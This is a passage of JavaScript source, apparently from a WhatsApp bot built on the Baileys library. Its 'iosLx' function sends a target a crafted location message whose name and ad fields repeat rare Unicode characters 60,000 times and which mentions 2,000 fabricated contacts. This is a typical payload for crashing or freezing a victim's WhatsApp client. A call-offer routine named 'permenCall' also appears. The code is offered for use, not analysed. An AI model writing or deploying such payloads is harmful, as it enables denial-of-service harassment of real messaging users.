    if (shouldIncludeDeviceIdentity) {
      const { encodeSignedDeviceIdentity } = require('@whiskeysockets/baileys/lib/Utils');
      offerContent.push({
        tag: 'device-identity',
        attrs: {},
        content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
      });
    }

    const stanza = {
      tag: 'call',
      attrs: {
        id: sock.generateMessageTag(),
        to: toJid
      },
      content: [{
        tag: 'offer',
        attrs: {
          'call-id': callId,
          'call-creator': sock.user.id
        },
        content: offerContent
      }]
    };

    await sock.query(stanza).catch(err => console.error("❌ Error sending call:", err));
    return { id: callId, to: toJid };
  } catch (error) {
    console.error("Error in permenCall:", error);
    return null;
  }
}

async function iosLx(sock, target) {
  for ( let z = 0; z < 2; z++ ) {
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          locationMessage: {
            degreesLatitude: 21.1266,
            degreesLongitude: -11.8199,
            name: "𑇂𑆵𑆴𑆿".repeat(60000),
            url: "https://t.me/forno",
            contextInfo: {
              mentionedJid: Array.from({ length:2000 }, (_, z) => `628${z + 1}@s.whatsapp.net`), 
              externalAdReply: {
                quotedAd: {
                  advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
                  mediaType: "IMAGE",
                  jpegThumbnail: null, 
                  caption: "𑇂𑆵𑆴𑆿".repeat(60000)
                },
                placeholderKey: {
                  remoteJid: "0s.whatsapp.net",
                  fromMe: false,
                  id: "ABCDEF1234567890"
                }
              }
            }
          }
        }
      }
    },{ participant: { jid:target } });
  }
}

// Add proper exit handling
process.on('SIGINT', () => {
  console.log('Received SIGINT, shutting down gracefully...');
  if (keyListWatcher) {
    fs.unwatchFile("keyList.json");
  }
  process.exit(0);
});

process.on('SIGTERM', () => {
  console.log('Received SIGTERM, shutting down gracefully...');
  if (keyListWatcher) {
    fs.unwatchFile("keyList.json");
  }
  process.exit(0);
});
